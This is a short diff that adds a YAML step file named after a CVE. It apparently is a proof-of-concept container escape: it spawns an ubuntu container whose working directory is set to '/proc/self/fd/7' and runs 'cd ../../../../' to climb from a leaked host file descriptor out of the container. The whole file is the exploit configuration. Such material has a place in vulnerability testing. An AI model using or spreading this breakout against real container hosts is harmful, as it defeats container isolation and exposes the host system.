@@ -1,0 +1,7 @@
+name: CVE-2024-21616 
+steps:
+  - spawnContainer:
+      name: CVE-2024-21616
+      image: ubuntu
+      cmd: cd ../../../../ 
+      working_dir: '/proc/self/fd/7'
